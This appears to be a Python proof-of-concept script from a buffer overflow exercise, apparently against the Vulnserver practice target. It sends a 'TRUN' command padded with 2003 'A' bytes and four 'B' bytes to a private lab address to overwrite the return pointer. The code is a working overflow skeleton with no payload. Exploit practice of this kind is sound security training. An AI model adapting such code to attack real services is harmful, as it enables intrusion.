#!/usr/bin/python

import socket
import sys

shellcode = "A" * 2003 + "B" * 4
data = "TRUN /.:/" + shellcode

ip = "192.168.1.11"
port = 9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send((data.encode()))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()
